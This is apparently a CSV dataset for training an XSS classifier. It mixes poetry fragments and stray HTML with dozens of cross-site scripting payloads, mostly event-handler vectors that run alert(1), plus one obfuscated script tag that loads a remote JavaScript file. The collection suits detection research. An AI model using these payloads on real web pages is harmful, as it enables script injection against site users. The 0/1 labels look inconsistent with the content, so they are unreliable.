text,label
I should go to Nineveh,1
<tt id=x tabindex=1 onactivate=alert(1)></tt>,1
heâ€™ll ever let touch his face.,1
<s id=x tabindex=1 onactivate=alert(1)></s>,0
put it on. I know itâ€™s not going to matter whether the,0
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",1
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,1
"<element onmousedown=""alert(1)"">test</element>",1
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"already within us: the frank look, the unabashed",0
"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",1
bonnet of a daffodilâ€”. Get divorced. Floss.,1
"<meta draggable=""true"" ondragleave=""alert(1)"">test</meta>",1
"Â  Used to be a whole lot of chalk around the Ark,",0
"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",0
"<style>:target {transform: rotate(180deg);}</style><i id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></i>",1
"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",0
<link onpointermove=alert(1)>XSS</link>,1
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",0
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""httx://.rocks/.js""></SCRIPT>",0
"I have a very important job for you, Yael, descendan",0
"<style>:target {color:red;}</style><template id=x style=""transition:color 1s"" ontransitionend=alert(1)></template>",0
in milk. he looked down at the,1
"<nobr draggable=""true"" ondragstart=""alert(1)"">test</nobr>",1
"<input onkeyup=""alert(1)"" contenteditable>test</input>",0
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",1
The cops arenâ€™t going to awe themselves,0
</span> </h3>,1
document.documentURI,1
<param onpointerout=alert(1)>XSS</param>,1
"<tr onclick=""alert(1)"">test</tr>",0
"<figcaption onkeydown=""alert(1)"" contenteditable>test</figcaption>",0
Costa Rica,1
no halo of thorns around my head. And all I,0
chalked & the missiles do all they were,1
<figcaption onpointerout=alert(1)>XSS</figcaption>,0
timed to the word denied with nothing,1
Â Â Â Â Â Â Â Â Â Â Â Â Â Â  how else could you record,1
expel him into the snowy street.,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></address>",1
<noscript onpointerup=alert(1)>XSS</noscript>,0
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,1
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",1
by the plucking of my beak,0
"<rb onbeforepaste=""alert(1)"" contenteditable>test</rb>",1
<embed onpointerover=alert(1)>XSS</embed>,0
"â€Šâ€Šâ€Šâ€Š......â€Šâ€Šâ€Šâ€ŠWheels, mainstays: coils and springs, tense feet",1
"not a beast, not a crib, nor yet her,",1
"alone in the Charleville of my den,",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></audio>",1
"<tt draggable=""true"" ondragend=""alert(1)"">test</tt>",0
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",0
"<b onmouseenter=""alert(1)"">test</b>",1
the door to life and unto the Kingdom of God.,0
<center id=x tabindex=1 onfocus=alert(1)></center>,1
<script id=x tabindex=1 onfocus=alert(1)></script>,1
"<ins onmouseover=""alert(1)"">test</ins>",0
<image onpointermove=alert(1)>XSS</image>,1
"<bdo onmouseup=""alert(1)"">test</bdo>",0
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>,0
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",1
"<datalist onmouseout=""alert(1)"">test</datalist>",0
"<tt draggable=""true"" ondrag=""alert(1)"">test</tt>",0
<svg id=x tabindex=1 onactivate=alert(1)></svg>,0
"<table oncopy=""alert(1)"" contenteditable>test</table>",1
"<style>@keyframes x{}</style><header style=""animation-name:x"" onanimationstart=""alert(1)""></header>",0
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",0
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",0
and let the music do the ascendingâ€“,0
I never heard the noise and silence of mass murder.,0
a posture torn from stone.,0
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",1
summoning the insomniacs (who were up,1
5,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>",1
"<input type=""text"" name=""q"" placeholder=""Search docs"" />",0
"<article onkeyup=""alert(1)"" contenteditable>test</article>",1
</span>,1
"<span onkeypress=""alert(1)"" contenteditable>test</span>",1
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",1
"opened my hands and heâ€™d place his faults,",1
Wolves in our botanical garden ask nothing of any hu,0
"</div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0
and no stopping him.,1
"<keygen onmouseup=""alert(1)"">test</keygen>",0
<svg><bdo onload=alert(1)></bdo>,0
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,1
No name so how do you discern a shape for,1
"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",0
"followed by a deep-drawn whoo,",0
glint in your eyes.,0
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",1
"there you will find her looking at you, babe in arm,",0
"<element onmouseleave=""alert(1)"">test</element>",1
the name of Elephant. In the name of Snake.,0
iii.,1
Suddenly you polish a syllogism of your own,0
</span> </li>,0
"<noembed onkeyup=""alert(1)"" contenteditable>test</noembed>",0
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,0
</span>,1
Hard wind at the graveside. Hard lives hardly there.,1
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",0
not useful? Anything,0
"Walk along, and learn to believe that awe asks nothi",0
Our tragedy is we canâ€™t see it.,1
"<kbd onbeforecopy=""alert(1)"" contenteditable>test</kbd>",0
Â,1
"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",1
the way it comes to me comes for me in all its,0
"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",1
<title>Scrapy 2.0 documentation &mdash; Scrapy 2.0.0 documentation</title>,1
<main onpointerover=alert(1)>XSS</main>,1
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",1
for earth to live again,1
solemnly wiped the calf slobbers off.,1
"<object draggable=""true"" ondragend=""alert(1)"">test</object>",0
a way to keep body and soul,0
â€” And faith?,0
"<button oncopy=""alert(1)"" contenteditable>test</button>",0
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",0
</div></div>,1
<noframes onpointermove=alert(1)>XSS</noframes>,1
He did the whole Qurâ€™an this way,1
<rp onpointerleave=alert(1)>XSS</rp>,0
</span>,0
"<blink onkeypress=""alert(1)"" contenteditable>test</blink>",1
"<main onmouseenter=""alert(1)"">test</main>",0
"<address onkeypress=""alert(1)"" contenteditable>test</address>",1
<div onpointerup=alert(1)>XSS</div>,1
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationstart=""alert(1)""></progress>",1
"<li id=""cite_note-Multi-agent_planning-114""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Multi-agent_planning_114-0"">^ </a> </b>",1
"a coat, a jacket, a leather purse",0
About grasshoppers this high up before,1
Â,1
